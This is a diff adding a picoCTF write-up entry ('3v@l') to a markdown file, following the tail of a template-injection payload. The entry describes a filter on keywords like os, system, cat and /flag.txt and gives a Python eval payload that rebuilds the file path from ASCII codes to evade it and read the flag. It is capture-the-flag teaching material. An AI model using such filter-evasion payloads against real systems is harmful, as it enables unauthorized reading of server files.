@@ -256,3 +256,16 @@ Payload
 |attr('\x72\x65\x61\x64')()}}
 ```
 and prints the picoCTF flag in the "h1" element.
+
+---
+
+### ID 484 — 3v@l
+
+## Approach:
+Dangerous keywords (`os`, `system`, `cat`, `/flag.txt`, etc.) are filtered or break syntax, so we avoid shells and instead perform **direct Python file I/O**.
+
+Payload:
+```
+open(''.join([chr(x) for x in [47,102,108,97,103,46,116,120,116]])).read()
+```
+Construct `/flag.txt` using ASCII codes (to bypass filters) and read the flag that's in the response.
